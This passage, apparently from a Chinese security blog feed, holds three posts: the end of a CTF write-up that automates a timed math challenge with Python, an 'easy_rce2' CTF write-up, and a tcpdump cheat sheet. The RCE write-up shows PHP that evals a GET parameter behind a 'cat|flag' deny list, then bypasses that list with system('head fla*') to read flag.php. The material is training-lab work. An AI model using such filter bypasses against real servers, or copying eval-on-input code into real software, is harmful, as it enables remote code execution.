class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>那你<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color: blue&quot;</span>&gt;</span>肯定<span class="tag">&lt;/<span class="name">a</span>&gt;</span>能把这个式子算出来发给我吧？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>4175 + 4391 = ?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;math_result&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;冲了&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;.&quot;</span>&gt;</span>我不服，再来<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">手速不够可以用工具：</span></span><br><span class="line"><span class="comment">import requests</span></span><br><span class="line"><span class="comment">import re</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li><p>尝试发送正确答案。</p></li><li><p>下方的结果不能正确响应应该是我们缺少参数，尝试加入Cookie。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -d <span class="string">&quot;math_result=8566&quot;</span> http://你的靶机ID.ctf.nynusec.com/  </span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;500 Internal Server Error&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Internal Server Error&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error <span class="keyword">in</span> the application.&lt;/p&gt;</span><br></pre></td></tr></table></figure><ul><li>能够正常请求但是提示我们答案错误。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -d <span class="string">&quot;math_result=答案&quot;</span> -b=<span class="string">&quot;session=Cookie&quot;</span> http://你的靶机ID.ctf.nynusec.com/ </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;给你一秒你把握住&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;听说你&lt;a style=<span class="string">&quot;color: green&quot;</span>&gt;能力堪比人形计算机&lt;/a&gt;？&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;那你&lt;a style=<span class="string">&quot;color: blue&quot;</span>&gt;肯定&lt;/a&gt;能把这个式子算出来发给我吧？&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;math_result&quot;</span>/&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> value=<span class="string">&#x27;冲了&#x27;</span>&gt;</span><br><span class="line">&lt;/form&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;输入的不对啊&lt;/div&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;&lt;a href=<span class="string">&quot;.&quot;</span>&gt;我不服，再来&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">手速不够可以用工具：</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;             </span><br></pre></td></tr></table></figure><ul><li>重新请求靶机的时候发现cookie已经改变。接下来应该需要使用Python。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -v http://你的靶机ID.ctf.nynusec.com/</span><br><span class="line">...</span><br><span class="line">&lt; Set-Cookie: session=eyJjdGltZSI6MTY2MTM0MzE2NSwibWF0aCI6IjE0ODAxIn0.YwYVvQ.3Xzezu9mm7lINTHOaRwp5eblpQw; HttpOnly; Path=/</span><br><span class="line">...</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;7786 + 7015 = ?&lt;/div&gt;</span><br><span class="line">...                                                </span><br></pre></td></tr></table></figure><ul><li>编写Python代码。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/&quot;</span></span><br><span class="line">// 请求靶机题目和Cookie。</span><br><span class="line">response = requests.get(url)</span><br><span class="line">// 使用正则匹配题目。</span><br><span class="line">topic = re.findall(<span class="string">&quot;(\d&#123;2,&#125; . \d&#123;2,&#125;)&quot;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">// 计算出答案。</span><br><span class="line">answer = <span class="built_in">eval</span>(topic)</span><br><span class="line">// 将答案和Cookie发送到靶机。</span><br><span class="line">result = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;math_result&quot;</span>: answer</span><br><span class="line">    &#125;,</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=&quot;</span> + response.cookies.get(<span class="string">&quot;session&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">// 匹配flag</span><br><span class="line">flag = re.findall(<span class="string">&quot;(flag\&#123;.+\&#125;)&quot;</span>, result.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><ul><li>运行脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ python main.py </span><br><span class="line">flag&#123;b281b684-****-****-****-ecb2fce81334&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;从下方的代码可以看出需要我们计算结果发送过去。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight html</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>S2-easy_rce2 WriteUp</title>
    <link href="http://webb-l.top/2022/08/24/S2-easy-rce2-WriteUp/"/>
    <id>http://webb-l.top/2022/08/24/S2-easy-rce2-WriteUp/</id>
    <published>2022-08-24T08:07:15.000Z</published>
    <updated>2022-08-24T08:36:57.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|flag/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 判断GET请求是否有cmd是否存在。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="comment">// 判断cmd的值是否包含有cat或flag（包含大小写）。</span></span><br><span class="line">    <span class="comment">// 比如：cat Cat CaT flag flAg fLAg 这些都会被正则匹配到。</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|flag/i&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li>尝试触发正则。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/etc]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶场ID.ctf.nynusec.com/?cmd=system(&#x27;flag&#x27;);&quot;</span>    </span><br><span class="line">...</span><br><span class="line">no no no        </span><br></pre></td></tr></table></figure><ul><li>尝试绕过正则。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/etc]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶场ID.ctf.nynusec.com/?cmd=system(&#x27;ls&#x27;);&quot;</span>             </span><br><span class="line">... </span><br><span class="line">flag.php index.php</span><br></pre></td></tr></table></figure><ul><li>使用head命令替代cat命令，使用fl*g绕过flag正则。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># %22 = &quot;</span></span><br><span class="line">┌──(kali㉿kali)-[/etc]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶场ID.ctf.nynusec.com/?cmd=system(%22head%20fla*%22);&quot;</span></span><br><span class="line">...</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;59274bf7-****-****-****-662b384a96c9&#125;&#x27;</span>;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>tcpdump 命令备忘录</title>
    <link href="http://webb-l.top/2022/07/19/tcpdump%20%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://webb-l.top/2022/07/19/tcpdump%20%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2022-07-19T14:57:45.000Z</published>
    <updated>2022-07-20T04:12:22.937Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Tcpdump 打印出网络接口上数据包内容的描述。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">tcpdump [options] [proto] [<span class="built_in">dir</span>] [<span class="built_in">type</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># options</span></span><br><span class="line">[-aAbdDefhHIJKlLnNOpqStuUvxX<span class="comment">#] [ -B size ] [ -c count ]</span></span><br><span class="line">[ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]</span><br><span class="line">[ -i interface ] [ -j tstamptype ] [ -M secret ] [ --number ]</span><br><span class="line">[ -Q <span class="keyword">in</span>|out|inout ]</span><br><span class="line">[ -r file ] [ -s snaplen ] [ --time-stamp-precision precision ]</span><br><span class="line">[ --immediate-mode ] [ -T <span class="built_in">type</span> ] [ --version ] [ -V file ]</span><br><span class="line">[ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ]</span><br><span class="line">[ -Z user ] [ expression ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># proto</span></span><br><span class="line">tcp udp icmp</span><br><span class="line">ip ipv6</span><br><span class="line">arp rarp</span><br><span class="line">ether wlan</span><br><span class="line"></span><br><span class="line"><span class="comment"># dir</span></span><br><span class="line">src dst</span><br><span class="line"></span><br><span class="line"><span class="comment"># type</span></span><br><span class="line">host net port portrange</span><br></pre></td></tr></table></figure><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump </span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:01:20.103144 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 999682989:999683185, ack 3034309012, win 501, options [nop,nop,TS val 3742754932 ecr 544450561], length 196</span><br><span class="line">15:01:20.103268 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 196, win 501, options [nop,nop,TS val 544450627 ecr 3742754932], length 0</span><br><span class="line">...</span><br><span class="line">15:01:20.620795 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 364648, win 998, options [nop,nop,TS val 544451144 ecr 3742755450], length 0</span><br><span class="line">15:01:20.620861 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 364648:365132, ack 1, win 501, options [nop,nop,TS val 3742755450 ecr 544451144], length 484</span><br><span class="line">15:01:20.621140 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [P.], <span class="built_in">seq</span> 1:37, ack 364648, win 998, options [nop,nop,TS val 544451144 ecr 3742755450], length 36</span><br><span class="line">2079 packets captured</span><br><span class="line">2079 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><p>解析信息。</p><table><thead><tr><th>时:分:秒.毫秒</th><th>网络协议</th><th>发送方的IP地址.端口&#x2F;主机名.协议（如果这里的端口能够对应上协议的端口就显示协议）&gt; 接收方IP地址.端口&#x2F;主机名.协议</th><th align="left"></th><th>协议的信息</th></tr></thead><tbody><tr><td>15:01:20.621140</td><td>IP</td><td>192.168.111.1.43116 &gt; webb.ssh</td><td align="left"></td><td>Flags [P.], seq 1:37, ack 364648, win 998, options [nop,nop,TS val 544451144 ecr 3742755450], length 36</td></tr></tbody></table><h2 id="过滤使用"><a href="#过滤使用" class="headerlink" title="过滤使用"></a>过滤使用</h2><h3 id="过滤特定IP地址数据包"><a href="#过滤特定IP地址数据包" class="headerlink" title="过滤特定IP地址数据包"></a>过滤特定IP地址数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump host 192.168.1.1</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:34:03.881935 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:34:03.884549 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:34:04.883253 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:34:04.884774 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:34:05.892408 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">15:34:05.921905 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">15:34:06.913191 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">15:34:06.920496 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">8 packets captured</span><br><span class="line">10 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="过滤发送方IP地址数据包"><a href="#过滤发送方IP地址数据包" class="headerlink" title="过滤发送方IP地址数据包"></a>过滤发送方IP地址数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump src 192.168.1.1</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:40:51.123117 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 7, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:40:52.125865 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 7, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:40:53.127900 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 7, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">3 packets captured</span><br><span class="line">3 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="过滤接收方IP地址数据包"><a href="#过滤接收方IP地址数据包" class="headerlink" title="过滤接收方IP地址数据包"></a>过滤接收方IP地址数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump dst 192.168.1.1</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:36:04.468257 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 5, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:36:05.469379 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 5, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:36:06.471280 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 5, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">3 packets captured</span><br><span class="line">3 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="过滤某个网段数据包"><a href="#过滤某个网段数据包" class="headerlink" title="过滤某个网段数据包"></a>过滤某个网段数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump net 192.168.1.0/24</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:43:20.125194 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 8, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:43:20.127335 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 8, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:43:21.147335 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 8, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:43:21.149613 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 8, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:43:22.128009 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 8, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">15:43:22.130053 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 8, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">15:43:24.042801 IP webb &gt; android-0000000000: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 9, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">...</span><br><span class="line">15:43:27.629869 IP webb &gt; 192.168.1.3: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 10, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:43:28.648935 IP webb &gt; 192.168.1.3: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 10, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:43:29.673008 IP webb &gt; 192.168.1.3: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 10, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">15:43:30.696968 IP webb &gt; 192.168.1.3: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 10, <span class="built_in">seq</span> 4, length 64</span><br><span class="line">15:43:30.698285 IP 192.168.1.68 &gt; webb: ICMP host 192.168.1.3 unreachable, length 92</span><br><span class="line">15:43:30.698285 IP 192.168.1.68 &gt; webb: ICMP host 192.168.1.3 unreachable, length 92</span><br><span class="line">15:43:30.698285 IP 192.168.1.68 &gt; webb: ICMP host 192.168.1.3 unreachable, length 92</span><br><span class="line">15:43:30.698285 